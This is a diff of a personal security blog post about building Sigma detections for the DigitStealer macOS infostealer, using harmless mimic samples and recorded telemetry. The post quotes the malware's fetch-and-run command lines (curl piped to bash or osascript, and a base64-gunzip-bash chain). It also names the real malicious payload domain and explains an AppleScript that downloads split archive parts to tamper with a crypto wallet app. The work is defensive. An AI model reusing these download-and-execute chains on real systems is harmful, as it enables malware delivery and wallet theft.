@@ -31,19 +31,19 @@ So why am I writing this blog? Because I want to, you're not my real dad, I do w
 
 I apologize for my outburst. As with all my other blogs, this was written for myself as an outlet to learn more about a specific subject. There may very well be better ways to do everything I do in this blog, and that's okay. Suckin at something is the first step toward bein sorta good at something.
 
-On November 13 2025 [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. This blog provides an incredibly informative write up of the key behaviours exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)
+On November 13 2025 [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. That blog provides an incredibly informative write up of the key behaviours exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)
 
 While reading this blog, I asked myself a series of questions. Namely:
 1. Do my current detectors fire on any of this activity?
 2. If they do, can my detector logic be improved?
 3. What is the best way to create sigma rules for this observed activity with my limited tooling? (I'll expand on this.)
-    - A/N: While writing this blog, Nebulock dropped their blog on [coreSigma](https://nebulock.io/blog/coresigma-expanding-sigma-detection-for-macos), an effort to expand the macOS sigma compatibility by building up a macos ESF pipeline. Keep an eye out on that because I'll surely be utilizing it in the future.
+>A/N: While writing this blog, Nebulock dropped their blog on [coreSigma](https://nebulock.io/blog/coresigma-expanding-sigma-detection-for-macos), an effort to expand the macOS sigma compatibility by building up a macos ESF pipeline. Keep an eye out on that because I'll surely be utilizing it in the future as its directly relevant to the process outlined here.
 
 We will be focusing on question three for the duration of this blog.
 
 ## The Problem (and My Solution)
 
-My first problem is that my malware analysis pipeline is a bit under the weather at the moment so I was not confident interfacing with live samples.  This caused me to have to use the information provided in the Jamf blog as well as in a few other public sources. (I'm working on getting it spun back up, leave me alone.)
+My first problem is that my malware analysis pipeline is a bit under the weather at the moment so I was not confident interfacing with live samples.  This caused me to have to use the information provided in the Jamf blog as well asx a few other public sources. (I'm working on getting it spun back up, leave me alone.)
 
 My second problem was that the actual telemetry I would need to detect against would be different than the source code provided in these blogs. I needed a way to see the resulting host telemetry without executing a (malicious) live sample. 
 
@@ -56,7 +56,7 @@ _He was trying his best_
 
 >A/N: This was true at the time of this analysis. In the middle of writing this blog I have since spun up an ELK stack bacause Splunk's macOS ingestion made me very sad. Further blogs will utilize ELK. 
 
-With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples. (This last part is the bit I will be replacing with ELK and coreSigma down the line.)
+With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples.
 
 ## The Observed Activity
 ### The Dropper
@@ -70,7 +70,7 @@ I didn't recreate every part of this malware. Instead I focused on a few key poi
 2. Payload one: The plain text `AppleScript`
     - This applescript pulls down three separate pieces of an `app.asar` file then concatenates them to modify Ledger Live.
 
-All other payloads came after this activity so I only found it necessary to mimic these first two sections (for now). I will be revisiting this with a live sample when I get Splunk spun up.
+All other payloads came after this activity so I only found it necessary to mimic these first two sections (for now). I will be revisiting this with a live sample when I get ~~Splunk~~ ELK spun up.
 
 Let's take a look at the dropper. It starts off with a `.pkg` file that, when executed, presents the user with a `Drag Into Terminal.msi` file and instructs them to drag it into `Terminal`.
 
@@ -99,9 +99,21 @@ echo '[malicious base64 encoded payload]' | base64 -d | gunzip | bash
 {: .nolineno }
 {% endraw %}
 
-This commandline takes the `base64` encoded payload, decodes it using `base64 -d` which reveals some compressed `gzip` data, pipes that to `gunzip` to uncompress it, then pipes the resulting payload to `bash`. 
+This commandline takes the `base64` encoded payload, decodes it using `base64 -d` which reveals some compressed `gzip` data, pipes that to `gunzip` to uncompress it, then pipes the resulting payload to `bash` for execution. 
 
-The resulting payload was a `bash` script that did a bunch of hardware checking using `system_profiler` and `sysctl` then had four `curl` statements to pull down further malicious payloads:
+After decoding the base64 and gunzipping it, the resulting data that got piped into `bash` was:
+
+{% raw %}
+```bash
+#!/bin/bash
+
+nohup curl -fsSL [Malicious URL] | osascript >/dev/null 2>&1 &
+sleep 1
+```
+{: .nolineno }
+{% endraw %}
+
+The resulting payload from this `curl` was a `bash` script that did a bunch of hardware checking using `system_profiler` and `sysctl` then had four `curl` statements to pull down further malicious payloads:
 
 {% raw %}
 ```bash
@@ -125,9 +137,9 @@ nohup curl -fsSL [malicious URL] | bash >/dev/null 2>&1 &
 >If you would like to follow along, all these files are present on my [github](https://github.com/IzzyBoop/FakeMalwareStaging/tree/main/DigitStealer%20Simulation).
 {: .prompt-info :}
 
-There were a few burning questions I needed to answer which would motivate which parts of this activity I would mimic. First, I wanted to know if dragging the `.msi` file into terminal would count as an interactive commandline session, and whether or not that means I would not see the initial `curl` at all in the resulting telemetry. Next, if I did see it in the telem, does it retain the whole command or does it split the commands up at the pipes?
+There were a few burning questions I needed to answer which would motivate which parts of this activity I would mimic. First, I wanted to know if dragging the `.msi` file into terminal would count as an interactive commandline session, and if that meant I would not see the initial `curl` at all in the resulting telemetry. Next, if I did see it in the telem, does it retain the whole command or does it split the commands up at the pipes?
 
-For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep -iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. 
+For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep -iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. (And sometimes not shown at all because EDRs hate macOS.)
 
 >You can find more information about macOS's weird PIDs and process forks in my other blog post [Basic macOS Malware Analysis](https://izzyboop.com/posts/MacOS-Static-Malware-Analysis-Techniques/).
 {: .prompt-info :}
@@ -162,7 +174,7 @@ echo
 {: file="dropper.sh" .nolineno }
 {% endraw %}
 
-This will hopefully allow me to see how these processes behave when loaded into memory and how that manifests in the telemetry. Will I see the base64? Will I see the decoded version? Will the commands be retained in their entirety or split apart? This is what I intend to find out.
+This will hopefully allow me to see how these processes behave when loaded into memory and how that manifests in the telemetry. Will I see the base64? Will I see the decoded version? Will the commands be retained in their entirety or split apart? How many licks does it really take to get to the tootsie roll center of a tootsie pop? Let's find out.
 
 Speaking of `Drag Into Terminal.msi`, we can now mimic that file too. As mentioned above, this file is just a text file with the `.msi` extension. The actual contents of the file were just a `curl` command with the `-fsSL` flags and piped to `bash`. I created the following file to download the `dropper.sh` file we just created and pushed it to my github as `Drag Into Terminal.msi`:
 
@@ -178,7 +190,7 @@ The execution chain at this point in time is as follows:
 
 1. `Drag Into Terminal.msi` dragged into terminal
     - `curl` pulls down `dropper.sh` into memory and pipes it into `bash`
-2. `dropper.sh`, from memory, pipes a base64 and gzip'd payload into `base64 -d`, `gunzip`, then into `bash`
+2. `dropper.sh` pipes a base64 and gzip'd payload into `base64 -d`, `gunzip`, then into `bash`
 3. `curl` pulls down applescript and pipes it into `osascript` for execution
 
 So far, so good. Let's move on to the AppleScript payload. 
@@ -238,7 +250,7 @@ do shell script "osascript -e 'set volume without output muted'"
 
 Let's break this down a bit. 
 
-In this first section we have our initial variable declarations. The last variable in the list, `kDomain` is a concatenation of `kDomainPrefix` (`67e5143a9ca7d2240c137ef80f2641d6`), a period, and `kDomainSuffix` (`pages.dev`) to create `67e5143a9ca7d2240c137ef80f2641d6.pages[.]dev`, our primary remote payload host in this stage of the execution.
+In this first section we have our initial variable declarations. The last variable in the list, `kDomain` is a concatenation of `kDomainPrefix` (`67e5143a9ca7d2240c137ef80f2641d6`), a period, and `kDomainSuffix` (`pages.dev`) to create `67e5143a9ca7d2240c137ef80f2641d6.pages[.]dev`, our primary remote payload host in this stage of the execution. Yes, that is the actual malicious URL, I hope you listened to me and read the Jamf blog first.
 
 Other variables here are used to determine paths used by the AppleScript, or the naming convention of files.
 
@@ -262,7 +274,7 @@ set kDomain to kDomainPrefix & "." & kDomainSuffix
 
 This next section starts off by setting the host's volume to mute. My assumption is that this is simply to avoid any system sounds that may be triggered by the following activity. Next we create our download folder and make sure we don't already have a `.zip` in place named `/tmp/app.asar.zip` by running a preliminary `rm -rf`. This is generally good practice for any payloads you may want to run more than once.
 
-Next we have the AppleScript version of a `for` loop. `repeat with i from 1 to kTotalParts` simply means repeat the following code 3 times and iterate the `i` variable from 1 to 3 as each loop runs. We start by setting the URL for part 1 (note the `i` in the concatenated file path), then we set the name of the output file. then run curl to download the file from the URL we just created. Then we use `cat` to read out and append the data directly to the `kMergedZip` file. It then repeats this for parts 2 and 3. Once all 3 parts are appended, this will be a valid `.zip` file.
+Next we have the AppleScript version of a `for` loop. `repeat with i from 1 to kTotalParts` simply means repeat the following code 3 times and iterate the `i` variable from 1 to 3 as each loop runs. We start by setting the URL for part 1 (note the `i` in the concatenated file path), then we set the name of the output file. then run curl to download the file from the URL we just created. Then we use `cat` to read out and append the data directly to the `kMergedZip` file. It then repeats this for parts 2 and 3. Once all 3 parts are appended, it will become a valid `.zip` file.
 
 {% raw %}
 ```applescript
